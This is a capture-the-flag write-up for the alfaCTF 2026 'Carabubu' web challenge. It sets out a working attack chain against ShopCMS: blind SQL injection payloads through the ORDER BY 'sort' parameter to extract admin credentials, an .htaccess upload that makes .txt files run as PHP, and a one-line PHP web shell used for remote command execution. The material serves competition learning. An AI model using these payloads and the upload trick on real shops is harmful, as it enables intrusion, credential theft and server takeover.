# Carabubu — alfaCTF 2026

**Category:** Web / Pentest  
**Difficulty:** Hard  
**Tags:** web, pentest, sqli, rce, php, shopcms, htaccess  
**Flag:** `alfactf{YOuR_FREE_l1m1tEd_lABubu_lOCa7IoN}`

## Overview

Find a file with the coordinates of a secret Titanium Summit Labubu drop, stored somewhere at the server root.

- **URL:** `https://carabubu-srv-hhv34z6f.alfactf.ru/`
- **Stack:** ShopCMS 3.1 Vip (a Russian PHP e-commerce CMS), PHP 5.3.29, nginx → Apache 2.4.10 (Debian)
- **DB:** MySQL, table prefix `bdvo_`
- **Encoding:** windows-1251 (Russian shop)

The end-to-end chain is: register a customer → blind SQLi to extract admin credentials → log into admin → upload a malicious `.htaccess` and a `.txt` web shell via the product-image uploader → RCE → read the flag binary at `/get_gift_location`.

## Stage 1 — Customer registration

The shop has a customer registration form at `/index.php?register=yes`.

- CAPTCHA is enabled but uses **only digits (0–9), 5–6 characters** — solvable by a human in seconds.
- Email confirmation (`CONF_ENABLE_REGCONFIRMATION`) is enabled, but the user can still log in.

Register any account, place at least one order through the cart (we'll need a non-empty `bdvo_orders` for stage 2), and note the `PHPSESSID` cookie after login.

## Stage 2 — Time-based blind SQL injection

### Vulnerable endpoint

```
GET /index.php?order_history=yes&search=1&sort=<PAYLOAD>
```

### Root cause

In `core/includes/order_history.php` the `sort` GET parameter is passed straight into `callBackParam["sort"]` after only `mysql_real_escape_string` (which doesn't escape parentheses or subqueries):

```php
$callBackParam["sort"] = xEscSQL($_GET["sort"]);
```

Then in `ordGetOrders()` (`core/functions/order_functions.php`) there is **no whitelist** (unlike the product search, which has one):

```php
$order_by_clause .= " order by ".xEscSQL($callBackParam["sort"])." ";
```

Producing:

```sql
SELECT ... FROM bdvo_orders WHERE customerID=X AND statusID!=0
ORDER BY <PAYLOAD>
```

### Why standard SLEEP doesn't work

`(SELECT SLEEP(3))` is optimised away by MySQL as a constant expression in `ORDER BY` and never actually runs.

### Key trick — real table inside the subquery

Wrapping `SLEEP` in a subquery against a **real table** forces evaluation:

```sql
ORDER BY (SELECT IF(condition, SLEEP(2), 0) FROM bdvo_orders LIMIT 1)
```

- **TRUE** (condition met) → ~2 s delay
- **FALSE** → ~0.3 s (baseline)

This requires at least one row in `bdvo_orders` (hence the placeholder order from stage 1).

### Credential extraction

Binary search per character, e.g.:

```sql
(SELECT IF(ORD(SUBSTRING((SELECT Login FROM bdvo_customers
  WHERE actions LIKE '%"100"%' LIMIT 1),1,1))>109,
  SLEEP(2), 0) FROM bdvo_orders LIMIT 1)
```

Result:

- Admin login: `cara`
- Admin password (base64): `YnVidTIwMjY=`
- Admin plaintext password: `bubu2026`

> **Note:** ShopCMS stores passwords as `base64_encode(plaintext)` — no hashing — so they're trivially reversible.

## Stage 3 — Admin login

```
POST /admin.php
enter=1&user_login=cara&user_pw=bubu2026
```

HTTP 302 redirect → admin panel access confirmed.

## Stage 4 — RCE via `.htaccess` + product-image upload

### Vulnerability

The admin product-image upload (`eaction=prod`, `save_pictures=1`) in `admin.php` calls `UpdatePicturesUpload()`, which uses `move_uploaded_file()` with the client-supplied filename — **no extension check**:

```php
move_uploaded_file($fileset["ufilenameu"]["tmp_name"], "data/small/".$filename);
```

The root `.htaccess` blocks `data/...php` (and similar executable extensions), but **not arbitrary extensions like `.txt`**, and **not `.htaccess` itself**.

### Exploit chain

**1. Upload a malicious `.htaccess` to `data/small/`:**

```
POST /admin.php?eaction=prod&productID=1
Content-Type: multipart/form-data

save_pictures=1&...&ufilenameu_1=@.htaccess (filename=".htaccess")
```

`.htaccess` content:

```apache
AddType application/x-httpd-php .txt
```

This makes Apache execute `.txt` files as PHP in `data/small/`.

**2. Upload PHP shell as `shell.txt`:**

```
POST /admin.php?eaction=prod&productID=1
Content-Type: multipart/form-data

save_pictures=1&...&ufilenameu_1=@shell.txt (filename="shell.txt")
```

`shell.txt` content:

```php
<?php system($_GET["c"]); ?>
```

**3. Execute commands:**

```
GET /data/small/shell.txt?c=id
→ uid=33(www-data) gid=33(www-data)
```

## Stage 5 — Flag

```
GET /data/small/shell.txt?c=/get_gift_location
```

`/get_gift_location` is a compiled ELF at the filesystem root that prints the flag (it reads from `/var/tmp/`).

## Flag

`alfactf{YOuR_FREE_l1m1tEd_lABubu_lOCa7IoN}`

## Summary

| Stage | Technique |
|-------|-----------|
| 1 | Customer registration (numeric CAPTCHA) |
| 2 | ORDER BY time-based blind SQLi (`bdvo_orders` real-table trick) |
| 3 | Admin login with extracted credentials (`cara` / `bubu2026`) |
| 4 | `.htaccess` upload via admin product image (no ext check) → PHP in `.txt` |
| 5 | RCE → read `/get_gift_location` |

## Files

Solver scripts: [`artifacts/`](artifacts/)

| File | Role |
|------|------|
| `sqli.py` | Time-based blind SQLi extractor (general-purpose) |
| `exploit.py` | End-to-end driver: session check → admin-credential extraction → preparation for the `.htaccess` upload |

Replace `SID` / `SESS` with your own `PHPSESSID` from a logged-in customer session before running.
